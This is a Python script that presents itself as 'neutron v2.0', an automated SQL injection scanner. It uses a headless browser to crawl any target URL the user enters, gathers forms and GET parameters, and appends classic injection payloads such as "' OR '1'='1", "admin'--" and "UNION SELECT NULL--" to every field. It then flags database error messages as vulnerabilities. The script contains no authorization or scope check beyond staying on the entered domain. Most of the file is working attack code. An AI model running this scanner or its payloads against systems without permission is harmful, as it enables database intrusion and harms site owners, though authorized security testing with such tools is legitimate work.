import sys
import time
import re
import urllib.parse
from playwright.sync_api import sync_playwright
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

COLORS = {
    "GET": "\033[92m",
    "POST": "\033[94m",
    "PUT": "\033[93m",
    "DELETE": "\033[91m",
    "OTHER": "\033[95m",
    "CYAN": "\033[96m",
    "GRAY": "\033[90m",
    "YELLOW": "\033[93m",
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
    "DIM": "\033[2m",
}

SQL_PAYLOADS = [
    ("'", "Single Quote Test"),
    ("' OR '1'='1", "Basic OR Injection"),
    ("' OR 1=1--", "OR Injection with comment"),
    ("' OR 1=1#", "OR Injection with #"),
    ("'--", "Comment Injection"),
    ("'#", "Comment Injection #"),
    ("' OR '1'='1' --", "OR Injection with space"),
    ("' UNION SELECT NULL--", "UNION NULL Test"),
    ("admin'--", "Admin Bypass"),
    ("admin'#", "Admin Bypass #"),
    ("1' AND '1'='1", "AND Injection"),
    ("1' AND '1'='2", "AND Injection False"),
]

SQL_ERROR_PATTERNS = {
    'high': [
        r"SQL syntax.*MySQL",
        r"You have an error in your SQL syntax",
        r"MySQLSyntaxErrorException",
        r"com\.mysql\.jdbc",
        r"java\.sql\.SQLException.*MySQL",
        r"SQLState:\s*\d{5}",
        r"ERROR:\s*syntax error at or near",
        r"PostgreSQL.*ERROR",
        r"org\.postgresql",
        r"PSQLException",
        r"PG::SyntaxError",
        r"ORA-\d{5}",
        r"oracle\.jdbc",
        r"Microsoft OLE DB Provider for SQL Server",
        r"SQL Server.*Error",
        r"SqlException",
        r"SQLite.*syntax error",
        r"django\.db\.utils\.IntegrityError",
        r"django\.db\.utils\.ProgrammingError",
        r"PDOException.*SQL",
        r"Doctrine\DBAL",
        r"Illuminate\\Database\\QueryException",
        r"SQLSTATE\[\d{5}\]",
        r"ActiveRecord::StatementInvalid",
        r"org\.hibernate\.exception",
        r"DataIntegrityViolationException",
    ],
    'medium': [
        r"SQL Error",
        r"database error",
        r"DB Error",
        r"mysql_fetch",
        r"mysqli_error",
        r"pg_query",
        r"oci_error",
        r"\[SQL\]",
        r"Query failed",
        r"Invalid query",
        r"Unknown column",
        r"Table '.*' doesn't exist",
        r"Column '.*' not found",
        r"Duplicate entry",
        r"Integrity constraint violation",
        r"null value in column",
        r"violates foreign key",
        r"violates not-null",
        r"cannot be null",
        r"not null constraint",
        r"unique constraint",
    ],
}

NON_SQL_PATTERNS = [
    r"404 Not Found",
    r"403 Forbidden",
    r"401 Unauthorized",
    r"500 Internal Server Error",
    r"Page not found",
    r"Invalid input",
    r"Validation error",
    r"Invalid email",
    r"Invalid username",
    r"Password must be",
    r"Username must be",
    r"Email is required",
    r"Password is required",
    r"Field is required",
    r"This field is required",
    r"Please enter",
    r"Please provide",
    r"من فضلك ادخل",
    r"هذا الحقل مطلوب",
    r"البريد الإلكتروني غير صحيح",
    r"كلمة المرور غير صحيحة",
    r"اسم المستخدم غير صحيح",
    r"CSRF token",
    r"csrf",
    r"token mismatch",
    r"invalid token",
    r"rate limit",
    r"too many requests",
    r"captcha",
    r"reCAPTCHA",
    r"hCaptcha",
    r"Turnstile",
    r"Cloudflare",
    r"Access Denied",
    r"Permission denied",
    r"Unauthorized",
    r"Forbidden",
]

class SQLInjectionCrawler:
    def __init__(self):
        self.discovered_urls = set()
        self.vulnerable_found = []
        self.all_forms = []
        self.all_get_params = []
        self.base_url = ""
        self.total_tests = 0
        self.vulnerable_tests = 0
        self.visited_urls = set()
        self.max_pages = 30
        self.suspicious_responses = []

    def print_banner(self):
        banner = f"""
            ███████╗    ██████╗    ██╗     
            ██╔════╝   ██╔═══██╗   ██║     
            ███████╗   ██║   ██║   ██║ {COLORS['CYAN']}>neutron{COLORS['RESET']}   
            ╚════██║   ██║▄▄ ██║   ██║ {COLORS['CYAN']}  v2.0{COLORS['RESET']}    
            ███████║   ╚██████╔╝   ███████╗
            ╚══════╝    ╚══██═╝    ╚══════╝
               {COLORS['RED']}[ SQL Injection Scanner ]{COLORS['RESET']}  """
        print(banner)

    def is_sql_error(self, response_text):
        if not response_text:
            return False, "No response", 0

        for pattern in NON_SQL_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return False, "Application error", 0

        for pattern in SQL_ERROR_PATTERNS['high']:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, "High confidence SQL error", 90

        high_count = 0
        for pattern in SQL_ERROR_PATTERNS['medium']:
            if re.search(pattern, response_text, re.IGNORECASE):
                high_count += 1

        if high_count >= 2:
            return True, f"Medium confidence SQL error ({high_count} patterns)", 70

        return False, "No SQL error detected", 0

    def analyze_response_for_sql(self, original_response, test_response):
        if not original_response or not test_response:
            return False, "No response"

        is_sql, reason, confidence = self.is_sql_error(test_response)
        if is_sql and confidence >= 60:
            return True, f"{reason} (Confidence: {confidence}%)"

        orig_len = len(original_response)
        test_len = len(test_response)

        if abs(orig_len - test_len) > orig_len * 0.2:
            indicators = ['error', 'exception', 'warning', 'syntax', 'traceback', 'stack']
            if any(i in test_response.lower() for i in indicators):
                return True, f"Significant response change ({abs(orig_len - test_len)} bytes)"

        return False, "No SQL injection detected"

    def get_all_links(self, page):
        links = set()
        try:
            a_tags = page.locator("a[href]")
            for i in range(a_tags.count()):
                try:
                    href = a_tags.nth(i).get_attribute("href")
                    if href and not href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
                        full_url = urljoin(self.base_url, href)
                        if self.is_same_domain(full_url):
                            links.add(full_url)
                except:
                    pass
        except:
            pass
        return links

    def extract_get_parameters(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            return {
                'url': url,
                'base_url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                'params': params
            }
        return None

    def get_all_forms(self, page):
        forms = []
        try:
            form_elements = page.locator("form")
            for i in range(form_elements.count()):
                try:
                    form = form_elements.nth(i)
                    action = form.get_attribute("action") or ""
                    method = form.get_attribute("method") or "get"
                    form_url = urljoin(self.base_url, action) if action else page.url

                    inputs = []
                    input_elements = form.locator("input:not([type='hidden']):not([type='submit']):not([type='button'])")
                    for j in range(input_elements.count()):
                        try:
                            inp = input_elements.nth(j)
                            inputs.append({
                                'name': inp.get_attribute("name") or "",
                                'type': inp.get_attribute("type") or "text",
                            })
                        except:
                            pass

                    textareas = form.locator("textarea")
                    for j in range(textareas.count()):
                        try:
                            ta = textareas.nth(j)
                            inputs.append({
                                'name': ta.get_attribute("name") or "",
                                'type': 'textarea',
                            })
                        except:
                            pass

                    forms.append({
                        'url': form_url,
                        'method': method.upper(),
                        'action': action,
                        'inputs': inputs,
                        'form_element': form
                    })
                except:
                    pass
        except:
            pass
        return forms

    def get_all_buttons(self, page):
        buttons = []
        try:
            button_selectors = [
                "button[type='submit']",
                "input[type='submit']",
                "button:not([type])",
                "button[type='button']",
                "a.btn",
                "a.button",
                "[role='button']",
                ".btn",
                ".button",
            ]

            for selector in button_selectors:
                try:
                    btn_elements = page.locator(selector)
                    for i in range(min(btn_elements.count(), 10)):
                        try:
                            btn = btn_elements.nth(i)
                            if btn.is_visible():
                                text = btn.text_content() or btn.get_attribute("value") or ""
                                buttons.append({
                                    'element': btn,
                                    'text': text[:50],
                                    'type': 'button'
                                })
                        except:
                            pass
                except:
                    pass
        except:
            pass
        return buttons

    def is_same_domain(self, url):
        try:
            parsed_base = urlparse(self.base_url)
            parsed_url = urlparse(url)
            return parsed_base.netloc == parsed_url.netloc
        except:
            return False

    def discover_pages(self, page):
        print(f"{COLORS['CYAN']}►{COLORS['RESET']} Discovering pages and endpoints...")

        links = self.get_all_links(page)
        print(f"{COLORS['GRAY']}   ↳ Found {len(links)} unique links{COLORS['RESET']}")

        if page.url not in self.discovered_urls:
            self.discovered_urls.add(page.url)

        for link in links:
            if link not in self.discovered_urls:
                self.discovered_urls.add(link)

            get_params = self.extract_get_parameters(link)
            if get_params:
                self.all_get_params.append(get_params)

        forms = self.get_all_forms(page)
        print(f"{COLORS['GRAY']}   ↳ Found {len(forms)} forms{COLORS['RESET']}")
        self.all_forms.extend(forms)

        buttons = self.get_all_buttons(page)
        print(f"{COLORS['GRAY']}   ↳ Found {len(buttons)} buttons{COLORS['RESET']}")

        return list(self.discovered_urls)

    def crawl_pages(self, context):
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} Crawling discovered pages...")

        pages_to_visit = list(self.discovered_urls)[:self.max_pages]
        total_pages = len(pages_to_visit)

        for idx, url in enumerate(pages_to_visit, 1):
            if url in self.visited_urls:
                continue

            print(f"{COLORS['GRAY']}   [{idx}/{total_pages}] Visiting: {url[:60]}...{COLORS['RESET']}", end=" ", flush=True)

            try:
                page = context.new_page()
                page.goto(url, timeout=15000, wait_until="networkidle")
                self.visited_urls.add(url)

                forms = self.get_all_forms(page)
                if forms:
                    self.all_forms.extend(forms)
                    print(f"{COLORS['GREEN']}✓ Found {len(forms)} forms{COLORS['RESET']}")
                else:
                    print(f"{COLORS['DIM']}✓ No forms{COLORS['RESET']}")

                new_links = self.get_all_links(page)
                for link in new_links:
                    if link not in self.discovered_urls:
                        self.discovered_urls.add(link)
                        get_params = self.extract_get_parameters(link)
                        if get_params:
                            self.all_get_params.append(get_params)

                page.close()
                time.sleep(0.3)

            except Exception as e:
                print(f"{COLORS['YELLOW']}⚠ Error: {str(e)[:30]}{COLORS['RESET']}")
                continue

        print(f"\n{COLORS['GREEN']}✓{COLORS['RESET']} Crawled {len(self.visited_urls)} pages")
        print(f"{COLORS['GREEN']}✓{COLORS['RESET']} Found {len(self.all_forms)} forms")
        print(f"{COLORS['GREEN']}✓{COLORS['RESET']} Found {len(self.all_get_params)} GET parameters")

    def get_response(self, url, data=None, method='POST', context=None):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
            }

            if method == 'POST':
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                headers['Origin'] = self.base_url
                headers['Referer'] = self.base_url
                response = context.request.post(url, headers=headers, data=data, timeout=10000)
            else:
                response = context.request.get(url, headers=headers, timeout=10000)

            return response.text()
        except:
            return None

    def inject_into_form_data(self, post_data, payload):
        try:
            params = urllib.parse.parse_qs(post_data)
            modified = {}

            for key, values in params.items():
                if values and values[0]:
                    if key in ['csrfmiddlewaretoken', 'csrf_token', '_token', 'authenticity_token']:
                        modified[key] = values[0]
                    else:
                        modified[key] = f"{values[0]}{payload}"
                else:
                    modified[key] = payload

            return urllib.parse.urlencode(modified)
        except:
            return None

    def test_get_parameters(self, context):
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} Testing GET parameters for SQL Injection...{COLORS['RESET']}\n")

        for param_data in self.all_get_params:
            url = param_data['url']
            base_url = param_data['base_url']
            params = param_data['params']

            original_data = {}
            for key, values in params.items():
                if values:
                    original_data[key] = values[0]

            if not original_data:
                continue

            original_url = f"{base_url}?{urlencode(original_data)}"
            original_response = self.get_response(original_url, method='GET', context=context)

            if not original_response:
                print(f"{COLORS['YELLOW']}⚠ Could not get original response for {base_url}{COLORS['RESET']}")
                continue

            print(f"\n{COLORS['BLUE']}━━━ Testing GET Parameters: {base_url}{COLORS['RESET']}")
            print(f"{COLORS['DIM']}    Parameters: {urlencode(original_data)[:80]}{'...' if len(urlencode(original_data)) > 80 else ''}{COLORS['RESET']}")

            for payload, payload_name in SQL_PAYLOADS:
                for param_key in original_data.keys():
                    test_params = original_data.copy()
                    test_params[param_key] = f"{original_data[param_key]}{payload}"
                    test_url = f"{base_url}?{urlencode(test_params)}"

                    print(f"{COLORS['GRAY']}   Testing: {COLORS['YELLOW']}{payload_name}{COLORS['RESET']} on {COLORS['MAGENTA']}{param_key}{COLORS['RESET']}", end=" ", flush=True)

                    test_response = self.get_response(test_url, method='GET', context=context)
                    if not test_response:
                        print(f"{COLORS['YELLOW']}⚠ No response{COLORS['RESET']}")
                        continue

                    self.total_tests += 1
                    is_vulnerable, reason = self.analyze_response_for_sql(original_response, test_response)

                    if is_vulnerable:
                        self.vulnerable_tests += 1
                        print(f"{COLORS['RED']}⚠ VULNERABLE!{COLORS['RESET']}")
                        print(f"{COLORS['DIM']}      → {reason}{COLORS['RESET']}")

                        self.vulnerable_found.append({
                            'url': test_url,
                            'payload': payload,
                            'payload_name': payload_name,
                            'parameter': param_key,
                            'data': test_url,
                            'reason': reason,
                            'original_response': original_response[:200],
                            'test_response': test_response[:200],
                        })
                        self.suspicious_responses.append({
                            'url': test_url,
                            'payload': payload,
                            'reason': reason
                        })
                    else:
                        print(f"{COLORS['GREEN']}✓ Safe{COLORS['RESET']}")

                    time.sleep(0.2)

    def test_form_for_sql(self, form_data, context):
        url = form_data['url']
        method = form_data['method']
        inputs = form_data['inputs']

        if method != 'POST' or not inputs:
            return

        original_data = {}
        for inp in inputs:
            name = inp.get('name')
            if name:
                name_lower = name.lower()
                if 'email' in name_lower or 'mail' in name_lower:
                    original_data[name] = 'test@example.com'
                elif 'password' in name_lower or 'pass' in name_lower:
                    original_data[name] = 'testpass123'
                elif 'phone' in name_lower or 'tel' in name_lower:
                    original_data[name] = '0512345678'
                elif 'national' in name_lower or 'id' in name_lower:
                    original_data[name] = '1234567890'
                else:
                    original_data[name] = 'test_input'

        if not original_data:
            return

        original_data_str = urllib.parse.urlencode(original_data)

        original_response = self.get_response(url, original_data_str, 'POST', context)
        if not original_response:
            print(f"{COLORS['YELLOW']}⚠ Could not get original response{COLORS['RESET']}")
            return

        print(f"\n{COLORS['BLUE']}━━━ Testing Form: {url}{COLORS['RESET']}")
        print(f"{COLORS['DIM']}    Data: {original_data_str[:80]}{'...' if len(original_data_str) > 80 else ''}{COLORS['RESET']}")

        for payload, payload_name in SQL_PAYLOADS:
            test_data = self.inject_into_form_data(original_data_str, payload)
            if not test_data:
                continue

            print(f"{COLORS['GRAY']}   Testing: {COLORS['YELLOW']}{payload_name}{COLORS['RESET']}", end=" ", flush=True)

            test_response = self.get_response(url, test_data, 'POST', context)
            if not test_response:
                print(f"{COLORS['YELLOW']}⚠ No response{COLORS['RESET']}")
                continue

            self.total_tests += 1

            is_vulnerable, reason = self.analyze_response_for_sql(original_response, test_response)

            if is_vulnerable:
                self.vulnerable_tests += 1
                print(f"{COLORS['RED']}⚠ VULNERABLE!{COLORS['RESET']}")
                print(f"{COLORS['DIM']}      → {reason}{COLORS['RESET']}")

                self.vulnerable_found.append({
                    'url': url,
                    'payload': payload,
                    'payload_name': payload_name,
                    'data': test_data,
                    'reason': reason,
                    'original_response': original_response[:200],
                    'test_response': test_response[:200],
                })
                self.suspicious_responses.append({
                    'url': url,
                    'payload': payload,
                    'reason': reason
                })
            else:
                print(f"{COLORS['GREEN']}✓ Safe{COLORS['RESET']}")

            time.sleep(0.3)

    def print_final_results(self):
        print(f"\n{COLORS['CYAN']}╔══════════════════════════════════════════════════════════════╗{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['BOLD']}📊 FINAL RESULTS{COLORS['RESET']}                                                    {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']}                                                                         {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}Pages Discovered:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.discovered_urls)}{COLORS['RESET']}                                              {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}GET Parameters:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.all_get_params)}{COLORS['RESET']}                                              {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}Forms Found:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.all_forms)}{COLORS['RESET']}                                                    {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}Tests Performed:{COLORS['RESET']} {COLORS['YELLOW']}{self.total_tests}{COLORS['RESET']}                                                {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}Vulnerabilities:{COLORS['RESET']} {COLORS['RED']}{self.vulnerable_tests}{COLORS['RESET']}                                                   {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']}                                                                         {COLORS['CYAN']}║{COLORS['RESET']}")

        if self.vulnerable_found:
            print(f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['RED']}⚠ {COLORS['BOLD']}VULNERABLE ENDPOINTS FOUND:{COLORS['RESET']}                                     {COLORS['CYAN']}║{COLORS['RESET']}")
            for idx, vuln in enumerate(self.vulnerable_found, 1):
                print(f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['RED']}{idx}.{COLORS['RESET']} {COLORS['YELLOW']}{vuln['url'][:60]}...{COLORS['RESET']}        {COLORS['CYAN']}║{COLORS['RESET']}")
                print(f"{COLORS['CYAN']}║{COLORS['RESET']}      {COLORS['DIM']}Payload:{COLORS['RESET']} {COLORS['MAGENTA']}{vuln['payload']}{COLORS['RESET']}                     {COLORS['CYAN']}║{COLORS['RESET']}")
                print(f"{COLORS['CYAN']}║{COLORS['RESET']}      {COLORS['DIM']}Reason:{COLORS['RESET']} {COLORS['YELLOW']}{vuln['reason'][:50]}{COLORS['RESET']}               {COLORS['CYAN']}║{COLORS['RESET']}")
        else:
            print(f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['GREEN']}✓ No SQL Injection Vulnerabilities Found{COLORS['RESET']}                               {COLORS['CYAN']}║{COLORS['RESET']}")

        print(f"{COLORS['CYAN']}╚══════════════════════════════════════════════════════════════╝{COLORS['RESET']}")

        if self.suspicious_responses:
            print(f"\n{COLORS['YELLOW']}╔══════════════════════════════════════════════════════════════╗{COLORS['RESET']}")
            print(f"{COLORS['YELLOW']}║{COLORS['RESET']} {COLORS['YELLOW']}⚠ {COLORS['BOLD']}SUSPICIOUS RESPONSES (Verify Manually){COLORS['RESET']}                         {COLORS['YELLOW']}║{COLORS['RESET']}")
            print(f"{COLORS['YELLOW']}╚══════════════════════════════════════════════════════════════╝{COLORS['RESET']}")
            for idx, sus in enumerate(self.suspicious_responses[:5], 1):
                print(f"\n{COLORS['YELLOW']}{idx}. URL: {sus['url'][:80]}...{COLORS['RESET']}")
                print(f"   Payload: {sus['payload']}")
                print(f"   Reason: {sus['reason']}")

    def run_scan(self, target_url):
        self.base_url = target_url

        print(f"\n{COLORS['CYAN']}╔══════════════════════════════════════════════════════════════╗{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['BOLD']}🔍 Starting SQL Injection Scan   {COLORS['RESET']}                            {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}╚══════════════════════════════════════════════════════════════╝{COLORS['RESET']}")

        with sync_playwright() as p:
            print(f"{COLORS['CYAN']}►{COLORS['RESET']} Initializing browser...")
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()

            print(f"{COLORS['CYAN']}►{COLORS['RESET']} Loading target: {COLORS['YELLOW']}{target_url}{COLORS['RESET']}")

            try:
                page.goto(target_url, timeout=30000)
                page.wait_for_load_state("networkidle", timeout=10000)
            except Exception as e:
                print(f"{COLORS['YELLOW']}⚠ Page load warning: {str(e)[:50]}{COLORS['RESET']}")

            self.discover_pages(page)
            self.crawl_pages(context)

            print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} Testing POST forms for SQL Injection...{COLORS['RESET']}\n")
            for form in self.all_forms:
                if form['method'] == 'POST':
                    self.test_form_for_sql(form, context)

            self.test_get_parameters(context)

            self.print_final_results()
            browser.close()

        return self.vulnerable_found

    def main(self):
        self.print_banner()
        print("\033[1;30m" + "=" * 60 + "\033[0m")
        print("")
        url = input(f"└──> {COLORS['BOLD']}Enter target URL :{COLORS['RESET']}").strip()
        if not url.startswith("http"):
            url = "https://" + url

        self.run_scan(url)
        sys.exit(0)

if __name__ == "__main__":
    crawler = SQLInjectionCrawler()
    crawler.main()